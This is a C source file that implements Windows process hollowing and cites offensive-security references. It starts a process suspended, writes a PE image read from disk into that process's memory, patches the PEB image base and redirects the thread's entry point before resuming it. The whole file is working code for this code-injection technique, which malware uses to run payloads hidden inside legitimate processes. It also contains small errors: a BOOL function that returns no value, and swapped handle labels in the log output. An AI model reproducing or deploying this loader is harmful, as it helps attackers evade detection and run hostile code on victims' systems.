#include "box.h"

// https://github.com/KnightChaser/simple-pe-parser/blob/master/simple-pe-parser/peParser.c
// https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp
// https://red-team-sncf.github.io/complete-process-hollowing.html
// https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations

BOOL CreateSuspendedProcess
(
	IN LPCSTR ProcessName,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread,
	OUT PDWORD PID
)
{

	BOOL				State = TRUE;
	STARTUPINFOA		StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		PRINT_ERROR("CreateProcessA");
		State = FALSE; goto CLEANUP;
	}

	if (!ProcessInfo.hProcess)
	{
		WARN("Failed to Create Process");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Thread Handle", ProcessInfo.hProcess);
	INFO("[0x%p] Process Handle", ProcessInfo.hThread);
	INFO("[%d] Process ID", ProcessInfo.dwProcessId);

	*PID = ProcessInfo.dwProcessId;
	*hProcess = ProcessInfo.hProcess;
	*hThread = ProcessInfo.hThread;


CLEANUP:

	return State;

}

BOOL ReadTargetFile
(
	IN LPCSTR PeName,
	OUT LPVOID* lpBuffer,
	OUT DWORD* nNumberOfBytesToRead
)

{

	HANDLE hFile = NULL;
	BOOL State = TRUE;
	LPDWORD lpNumberOfBytesRead = NULL;
	DWORD NumberOfBytesToRead = NULL;
	LPVOID lppBuffer = NULL;

	if (!PeName || !lpBuffer || !nNumberOfBytesToRead)
		return FALSE;

	if ((hFile = CreateFileA(PeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateFileA");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Current File Handle", hFile);


	if ((NumberOfBytesToRead = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
	{
		PRINT_ERROR("GetFileSize");
		State = FALSE; goto CLEANUP;
	}

	INFO("[%ld] Current File Size", NumberOfBytesToRead);


	if ((lppBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, NumberOfBytesToRead)) == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto CLEANUP;
	}

	INFO("[%ld] Allocated Bytes to Buffer", NumberOfBytesToRead);


	if (!ReadFile(hFile, lppBuffer, NumberOfBytesToRead, lpNumberOfBytesRead, NULL)) // lpNumberOfBytesRead can only be NULL if lpOverlapped exists
	{
		PRINT_ERROR("ReadFile");
		State = FALSE; goto CLEANUP;
	}

	OKAY("Successfully Read File!");

	*lpBuffer = lppBuffer;
	*nNumberOfBytesToRead = NumberOfBytesToRead;

CLEANUP:

	if (hFile)
		CloseHandle(hFile);

	return State;

}

BOOL GrabPeHeader
(
	OUT PIMAGE_NT_HEADERS* pImgNt,
	OUT PIMAGE_SECTION_HEADER* pImgSecHeader,
	OUT PIMAGE_DATA_DIRECTORY* pImgDataDir,
	IN LPVOID lpFile
)

{

	PBYTE pBase = (PBYTE)lpFile;

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Magic Letters");
		return;
	}

	PIMAGE_NT_HEADERS pImgNt64 = (PIMAGE_NT_HEADERS)((DWORD_PTR)pBase + pImgDos->e_lfanew);
	if (pImgNt64->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Nt Signature");
		return;
	}

	PIMAGE_OPTIONAL_HEADER pImgOpt = &pImgNt64->OptionalHeader;

	PIMAGE_SECTION_HEADER pImgSecHead = IMAGE_FIRST_SECTION(pImgNt64);

	PIMAGE_DATA_DIRECTORY pImgDataDir64 = &pImgOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	*pImgNt = pImgNt64;
	*pImgSecHeader = pImgSecHead;
	*pImgDataDir = pImgDataDir64;

}

BOOL HollowExec
(
	IN HANDLE hProcess,
	IN PIMAGE_NT_HEADERS pImgNt,
	IN LPVOID* rBuffer,
	IN LPVOID PeBaseAddress,
	IN PIMAGE_SECTION_HEADER pImgSecHeader,
	IN PIMAGE_DATA_DIRECTORY pImgDataDir,
	IN LPVOID lppBuffer,
	OUT DWORD* Delta
)

{

	if (!hProcess || !pImgNt || !rBuffer)
		return FALSE;

	BOOL	State				= TRUE;
	DWORD	dwOldProt			= 0, 
			dwDelta				= 0, 
			RelocOffset			= 0,
			dwProt				= 0;
	SIZE_T	lpNumOfBytesWritten = 0;


	if ((*rBuffer = VirtualAllocEx(hProcess, (LPVOID)pImgNt->OptionalHeader.ImageBase, (SIZE_T)pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL)
	{
		PRINT_ERROR("VirtualAllocEx");
		State = FALSE; goto CLEANUP;
	}

	LPVOID RemoteBase = *rBuffer;

	INFO("[0x%p] Remote Base Address", RemoteBase);

	dwDelta = (DWORD)RemoteBase - pImgNt->OptionalHeader.ImageBase;

	printf(
		"[v] [0x%p] Source Image Base\n"
		"[v] [0x%p] Dest Image Base\n"
		"[v] [0x%p] Relocation Delta\n",
		pImgNt->OptionalHeader.ImageBase,
		RemoteBase,
		dwDelta
	);

	if (RemoteBase != (LPVOID)pImgNt->OptionalHeader.ImageBase)
	{
		WARN("Image Base NOT The Same!");
		State = FALSE; goto CLEANUP;
	}

	if (!WriteProcessMemory(hProcess, RemoteBase, lppBuffer, pImgNt->OptionalHeader.SizeOfHeaders, &lpNumOfBytesWritten))
	{
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto CLEANUP;
	}

	INFO("Wrote Process Memory --> [0x%p] With Size --> [%d]", RemoteBase, pImgNt->OptionalHeader.SizeOfHeaders);

	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
	{

		if (!pImgSecHeader[i].PointerToRawData)
			continue;

		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				dwProt = PAGE_EXECUTE_READWRITE;
			else
				dwProt = PAGE_EXECUTE_READ;
		}
		else {
			if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				dwProt = PAGE_READWRITE;
			else
				dwProt = PAGE_READONLY;
		}

		PVOID SecBaseAddress = (PVOID)((PBYTE)RemoteBase + pImgSecHeader[i].VirtualAddress);
		PVOID SecBuffer = (PVOID)((PBYTE)lppBuffer + pImgSecHeader[i].PointerToRawData);
		SIZE_T size = pImgSecHeader[i].Misc.VirtualSize;

		if (pImgSecHeader[i].SizeOfRawData) {
			if (!WriteProcessMemory(hProcess, SecBaseAddress, SecBuffer, pImgSecHeader[i].SizeOfRawData, &lpNumOfBytesWritten))
			{
				PRINT_ERROR("WriteProcessMemory");
				State = FALSE; goto CLEANUP;
			}
		}

		if (!VirtualProtectEx(hProcess, SecBaseAddress, size, dwProt, &dwOldProt))
		{
			PRINT_ERROR("VirtualProtectEx");
			State = FALSE; goto CLEANUP;
		}

		OKAY("Wrote [%s] section --> at [0x%p] Base Address With Size --> [%d]", pImgSecHeader[i].Name, SecBaseAddress, pImgSecHeader[i].SizeOfRawData);


	}

	*Delta = dwDelta;

CLEANUP:

	return State;

}

BOOL GetThreadCtx
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PIMAGE_NT_HEADERS pImgNt,
	IN LPVOID rBuffer
)

{

	if (!hThread || !rBuffer)
		return FALSE;

	BOOL	State = TRUE;
	CONTEXT ThreadCtx;

	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(hThread, &ThreadCtx))
	{
		PRINT_ERROR("GetThreadContext");
		State = FALSE; goto CLEANUP;
	}


	INFO("[CTX @ 0x%p] Current Thread Context", &ThreadCtx);

	printf(
		"_______________\n"
		"| \n"
		"| [RCX]: [0x%016llX]\n"
		"| [RDX]: [0x%016llX]\n"
		"| [RSP]: [0x%016llX]\n"
		"| [RIP]: [0x%016llX]\n"
		"| \n"
		"_______________\n",
		ThreadCtx.Rcx,
		ThreadCtx.Rdx,
		ThreadCtx.Rsp,
		ThreadCtx.Rip
	);


	BOOL writePeb = WriteProcessMemory(hProcess, (PVOID)(ThreadCtx.Rdx + 0x10), &pImgNt->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
	if (!writePeb)
	{
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto CLEANUP;
	}

	INFO("[RCX] --> [0x%p] Updating Count Instruction...", (PVOID)ThreadCtx.Rcx);

	ThreadCtx.Rcx = (LPVOID)((PBYTE)rBuffer + pImgNt->OptionalHeader.AddressOfEntryPoint);

	if (!SetThreadContext(hThread, &ThreadCtx))
	{
		PRINT_ERROR("SetThreadContext");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[RCX] --> [0x%p] Instruction Updated... Pointing to out Allocated Buffer --> [0x%p]", (PVOID*)ThreadCtx.Rcx, rBuffer);

	if (!ResumeThread(hThread))
	{
		PRINT_ERROR("ResumeThread");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] waiting for thread to finish execution...", hThread);

	WaitForSingleObject(hThread, INFINITE);

	INFO("[0x%p] thread finished execution! beginning cleanup...", hThread);

CLEANUP:

	return State;

}